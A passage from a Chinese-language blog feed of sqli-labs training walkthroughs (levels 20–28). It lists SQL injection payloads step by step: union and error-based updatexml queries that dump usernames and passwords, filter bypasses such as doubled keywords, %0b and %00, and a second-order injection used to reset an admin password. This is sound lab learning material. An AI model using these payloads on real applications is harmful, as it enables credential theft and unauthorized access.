<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>只要判断出是那种加密方式，接下来的步骤就简单了。</p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_20</title>
    <url>/2022/11/15/sqli-labs_20/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本次的难度也不大，关键是要知道方法</p>
<span id="more"></span>

<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>测试并判断注入类型<br>正常输入了admin之后，我们发现出现了如下界面：<br><img src="/simg/sqli-labs_20.png" alt="返回情况"><br>点击下方的按钮，返回到原来界面<br>接下来我们再次输入admin，并显示到该界面，可以明显看出，cookie字段显示出来。<br>然后我们按F12，点击存储，再点击Cookie下的链接，修改值为admin’<br>刷新后，出现报错，说明存在注入。<br>因此我们可以利用修改cookie的方式进行注入</p>
</li>
<li><p>猜解SQL查询语句中的字段数</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">admin<span class="string">&#x27;order by 4 #</span></span><br></pre></td></tr></table></figure>
<p>报错，说明字段数为3</p>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,database(),version() #</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; #</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; #</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,2,group_concat(username,&#x27;:&#x27;,password) from users #</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>若问我为什么知道这么做，我只能说，在网上看来的。( ╯□╰ )</p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_23</title>
    <url>/2022/11/16/sqli-labs_23/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>再次回归GET注入，只是已有变化了</p>
<span id="more"></span>

<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li>测试并判断注入类型<br>输入<code>?id=1</code> 返回用户名和密码<br>输入<code>?id=1&#39;</code> 返回报错<br>输入<code>?id=1&#39;order by 3 --+</code> 返回报错<br>输入<code>?id=1&#39;order by 3 #</code> 返回报错<br>可以查看源码，发现了一个preg_replace()函数<br>这里作用是相当于将$id中的$reg类型的字符转变位$replace字符，也就是将$id中的#和--置空过滤<br>说明注释被过滤了，那么接下来将提供两种思路</li>
</ol>
<h2 id="第1种"><a href="#第1种" class="headerlink" title="第1种"></a>第1种</h2><p>采用URL终止符<code>%00</code></p>
<ol start="2">
<li><p>猜解SQL查询语句中的字段数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;order by 4; %00</span><br></pre></td></tr></table></figure>
</li>
<li><p>爆出显示位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,3; %00</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,database(),version(); %00</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27;; %00</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27;; %00</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(username,&#x27;:&#x27;,password) from users; %00</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="第2种"><a href="#第2种" class="headerlink" title="第2种"></a>第2种</h2><p>单引号闭合<code>?id=1&#39; or &#39;1&#39;=&#39;1</code></p>
<ol start="2">
<li><p>猜解SQL查询语句中的字段数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 6,2,3,4 or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p>爆出显示位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 6,2,3,4 or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 6,database(),3 or &#x27;1&#x27;=&#x27;1</span><br><span class="line">?id=-1&#x27; union select 6,version(),3 or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),3 or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),3 or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(username,&#x27;:&#x27;,password) from users),3 or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>主要是把注入方式搞清楚，构造语句和原来差不多</p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_24</title>
    <url>/2022/11/17/sqli-labs_24/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关又采用了新的一种注入方式，和以往不太一样。</p>
<span id="more"></span>

<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>测试并判断注入类型<br>进入页面，我们可以看到有3个页面：log in, forgot password, new user<br>在log in 页面输入错误的账户名密码时，会返回错误页面。而当输入正确时，返回正确页面，并且可以更改密码。<br>查看源码时，可以发现，登录和注册页面都使用了mysql_real_escape_string()函数。<br>mysql_real_escape_string()函数的作用简单来说，是转义SQL语句中使用的字符串中的特殊字符。详细可看：<a href="https://www.w3school.com.cn/php/func_mysql_real_escape_string.asp">PHP mysql_real_escape_string() 函数</a><br>因此，我们无法通过用户名和密码进行注入。但是，我们在查看pass_change.php时，可以发现这一行语句：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$username<span class="operator">=</span> $_SESSION[&quot;username&quot;];</span><br></pre></td></tr></table></figure>
<p>也即修改密码时，用户名不会转义。<br>通常情况下，我们并不知晓admin的账户密码，因此只能猜测用户名是admin，去创造一个新用户为<code>admin&#39;#</code>的账号来绕过admin，修改admin的密码。这里涉及到了二次注入的概念。<br>二次注入：攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。<br>二次注入，可以概括为以下两步:<br>第一步：插入恶意数据进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。<br>第二步：引用恶意数据开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</p>
</li>
<li><p>注册新用户绕过admin修改admin的密码<br>首先注册一个账号，名为<code>admin&#39;#</code><br>密码123456<br>然后登录该账号<br>再修改密码为111111<br>可以看到页面显示修改成功<br>我们再次登录，账号：admin  密码：111111<br>发现管理员账户登录就成功了。</p>
</li>
</ol>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>二次注入的简单实践。</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a><br><a href="https://blog.csdn.net/dreamthe/article/details/123795302">详细sqli-labs（1-65）通关讲解</a><br><a href="https://blog.csdn.net/qq_42266432/article/details/120072927">sqli-labs第二十四关(二阶注入)</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_25+25a</title>
    <url>/2022/11/17/sqli-labs_25+25a/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关页面上有明显提示，可以巧妙利用一下</p>
<span id="more"></span>

<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li>测试并判断注入类型<br>首先本关页面出现了明显提示，or和and似乎都不能使用了。但我们检查源码时，我们可以发现这一段函数<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/AND/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
从这个函数可以发现，or和and被替换成空了，但这个替换只会检查一次所有字符，将字符里的所有含or或and的字符替换成空字符。<br>下面尝试注入</li>
</ol>
<p><code>?id=1</code><br>返回正常<br><code>?id=1&#39;</code><br>返回错误<br>因此可以以这种方式注入<code> ?id=1&#39; --+ </code><br>但要注意，语句中存在or字符时，需要写成oorr，这样中间的or被替换为空字符后，剩下的字符仍然能构成or<br>and字符也是同理<br>By the way, 函数只是把or和and字符过滤，但和or字符相同含义的||没有被过滤，and字符相同含义的&amp;&amp;没有被过滤。因此有时也可用||和&amp;&amp;代替。</p>
<ol start="2">
<li><p>猜解SQL查询语句中的字段数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;oorrder by 4 --+</span><br></pre></td></tr></table></figure>
</li>
<li><p>爆出显示位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,database(),version() --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(column_name) from infoorrmation_schema.columns where table_name=&#x27;users&#x27; --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(username,&#x27;:&#x27;,passwoorrd) from users --+</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="第25a关"><a href="#第25a关" class="headerlink" title="第25a关"></a>第25a关</h2><p>与25关类似，只是没有单引号</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>新知识+1</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_26+26a</title>
    <url>/2022/11/17/sqli-labs_26+26a/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>相当于前一关的加强版？</p>
<span id="more"></span>

<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li>测试并判断注入类型<br>源码审计<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);     <span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">  <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/and/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">  <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//strip out /*</span></span><br><span class="line">  <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out --</span></span><br><span class="line">  <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);     <span class="comment">//Strip out #</span></span><br><span class="line">  <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces</span></span><br><span class="line">  <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out slashes</span></span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
我们可以看到，这一次，不仅仅是or与and，还多过滤了好几种情况<br>我们只需要绕过即可，对于空格有几种方式：</li>
</ol>
<ul>
<li>编码绕过<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%09 TAB键（空格）  %0A 新建一行（空格）</span><br><span class="line">%0C 新的一页       %0D return即回车功能（php-5.2.17,5.3.29成功）</span><br><span class="line">%0B TAB键（垂直）  %A0 空格（php-5.2.17成功）</span><br></pre></td></tr></table></figure></li>
<li>括号绕过<br>用()绕过，不使用任何空格</li>
<li>以上方法不一定都对自己的配置有效，需要尝试</li>
</ul>
<h2 id="第1种"><a href="#第1种" class="headerlink" title="第1种"></a>第1种</h2><p>这里使用()的方式绕过空格</p>
<ol start="2">
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(select(database())),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(select(version())),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#x27;security&#x27;)),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name=&#x27;users&#x27;)),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=&#x27;||updatexml(1,concat(&#x27;~&#x27;,(select(concat(&#x27;~&#x27;,id,&#x27;~&#x27;,username,&#x27;~&#x27;,passwoorrd))from(users)limit%0b0,1)),0)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="第2种"><a href="#第2种" class="headerlink" title="第2种"></a>第2种</h2><p>这里使用%0b的方式绕过空格，%26%26绕过and</p>
<ol start="2">
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=&#x27;%0bunion%0bselect%0b1,database(),3%26%26&#x27;1&#x27;=&#x27;1</span><br><span class="line">?id=&#x27;%0bunion%0bselect%0b1,version(),3%26%26&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=&#x27;union%0bselect%0b1,group_concat(table_name),3%0bfrom%0binfoorrmation_schema.tables%0bwhere%0btable_schema=&#x27;security&#x27;%26%26%0b&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=&#x27;union%0bselect%0b1,group_concat(column_name),3%0bfrom%0binfoorrmation_schema.columns%0bwhere%0btable_schema=&#x27;security&#x27;%0baandnd%0btable_name=&#x27;users&#x27;%26%26%0b&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=&#x27;union%0bselect%0b1,group_concat(username,0x7e,passwoorrd),3%0bfrom%0busers%0bwhere%0b&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="第26a关"><a href="#第26a关" class="headerlink" title="第26a关"></a>第26a关</h2><p>与26关相比，只是闭合方式变更为’)</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>使用url编码后，逐渐让语句变得不那么好读了…</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/m0_46315342/article/details/106557886">Sqli-labs之Less-26和Less-26a</a><br><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_27+27a</title>
    <url>/2022/11/17/sqli-labs_27+27a/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>相比之前并没有大的变化，照猫画虎罢了</p>
<span id="more"></span>

<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>测试并判断注入类型<br>本关通过查看源码可知，select和union被过滤了，但and和or这次没被过滤</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out --.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//Strip out #.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select/m&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out union</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/UNION/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out UNION</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/SELECT/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out SELECT</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out Union</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>问题不大，可以通过大小写或重写绕过</p>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(sElect(database())),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(sElect(version())),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(sElect(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;security&#x27;),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(sElect(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;users&#x27;),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(sElect(concat(username,&#x27;:&#x27;,password))from(users)limit%0b0,1)),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="第27a关"><a href="#第27a关" class="headerlink" title="第27a关"></a>第27a关</h2><p>与27关相比，只是闭合方式变更为”</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>a piece of cake~</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_28</title>
    <url>/2022/11/17/sqli-labs_28+28a/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>绕过该绕过的，注入照常注入</p>
<span id="more"></span>

<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><ol>
<li>测试并判断注入类型<br>查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);				<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);				<span class="comment">//Strip out --.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);					<span class="comment">//Strip out #.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    		<span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="comment">//$id= preg_replace(&#x27;/select/m&#x27;,&quot;&quot;, $id);	   		 	//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    		<span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/union\s+select/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out UNION &amp; SELECT.</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
绕过union和select，选择重写或加字符绕过<br>末尾选择字符串截断%00<br>或<code>%0aand(&#39;1</code></li>
</ol>
<h1 id="第1种"><a href="#第1种" class="headerlink" title="第1种"></a>第1种</h1><ol start="2">
<li><p>猜解SQL查询语句中的字段数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;)%0Aorder%0Aby%0A4%0Aand(&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p>爆出显示位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;)%0aunion%0aunion%0aselectselect%0a1,2,3%0aand(&#x27;1</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
